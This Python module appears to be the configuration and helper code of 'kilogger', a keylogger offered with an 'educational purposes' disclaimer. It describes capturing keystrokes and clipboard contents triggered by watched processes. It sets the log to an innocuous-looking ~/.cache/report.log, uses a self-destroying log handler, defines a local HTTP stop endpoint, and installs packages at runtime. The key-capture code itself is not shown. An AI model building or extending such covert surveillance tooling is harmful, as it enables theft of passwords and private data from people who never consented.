"""
kilogger: A Keylogger Utility for Educational Purposes

Functionalities:
- Capture and log pressed keys.
- Watch processes to trigger keylogger.
- Log clipboard data.
- Stop logger with an HTTP request.

Disclaimer:
kilogger is intended for educational purposes only. It is not designed
for malicious use or unauthorized access. By using this project, you
agree to use it responsibly and ethically.
The developers of this project are not responsible for any misuse of
this tool, and users are responsible for their actions. This project
is provided "as is" without warranties.

Version: 1.0.0
"""
import subprocess
import sys
from pathlib import Path

# default log path
U_HOME = Path('~')
LOGLOC = str(U_HOME.expanduser() / '.cache' / 'report.log')

# configuration for logging management
CONFIG = {
    "version": 1,
    "disable_existing_loggers": False,
    "formatters": {
        "simple": {
            "format": "%(message)s"
        }
    },
    "handlers": {
        "file": {
            # "class": "logging.handlers.RotatingFileHandler",
            "class": "kilogger.cli.AutoDestroyHandler",
            "level": "INFO",
            "formatter": "simple",
            "filename": "./out",
            "maxBytes": 10000,
            "backupCount": 3
        }
    },
    "loggers": {
        "root": {
            "level": "INFO",
            "handlers": ["file"]
        }
    }
}

# time that is waited to interrupt logging and check running processes
DEFAULT_TIMEOUT = 10

# response for http://127.0.0.1:65432/terminate
MSG = 'Closed'
STOP_RESPONSE = (f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: text/plain\r\n"
            f"Content-Length: {len(MSG)}\r\n\r\n{MSG}")


def install_package(package):
    """runs pip install 'package'"""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def verify_package_installation(package):
    """tries to import the package"""
    try:
        __import__(package)
        return True
    except ImportError:
        return False
